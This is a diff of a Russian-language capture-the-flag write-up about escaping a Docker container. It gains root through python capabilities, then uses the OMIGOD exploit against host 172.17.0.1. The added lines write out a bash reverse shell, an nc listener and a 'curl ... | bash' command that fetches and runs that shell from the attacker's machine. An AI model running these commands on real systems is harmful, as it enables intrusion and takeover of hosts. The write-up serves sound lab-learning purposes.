@@ -34,7 +34,7 @@
 
 C помощью linpeas'a мы узнаём, что можем проэксплуатировать **python capabilities**, с помощью команды `python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'` получаем **root**'a в докере&#x20;
 
-<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
 
@@ -52,8 +52,22 @@ C помощью linpeas'a мы узнаём, что можем проэкспл
 
 Данный сервис имеет уязвимость, которую мы можем проэксплуатировать с помощью **omigod**-экспойта
 
-Создаём **.py** файл, куда копируем скрипт и так же загружаем на машину
+Загружаем его в папку /tmp
 
-Далее вводим команду `python3 file_name.py -t 172.17.0.1 -p 5986 -c "cat /root/root.txt"` и получаем второй флаг🚩
+Перед эксплуатацией уязвимости создадим на собственной машине в папке /tmp файл shell.sh, где будет храниться bash\_rev\_shell(`bash -i >& dev/tcp/self_ip/6666 0>&1`)
 
-<figure><img src="../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+
+В той же папке /tmp подключаем **python3**-сервер (port - **3333**)
+
+Запускаем слушатель `nc -lvnp`` `**`6666`** на своей машине
+
+На атакуемой машине в папке /tmp выполняем команду
+
+&#x20;`python3 name_of_exploit -t 172.17.0.1 -c "curl self_ip:3333/`[`shell.sh`](https://vk.com/away.php?to=http%3A%2F%2Fshell.sh\&cc\_key=) `| bash"`
+
+<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Как итог, мы выбрались из докера и получили шелл основного сервера атакуемой машины, остаётся лишь вывести флаг **root.txt**
+
+<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
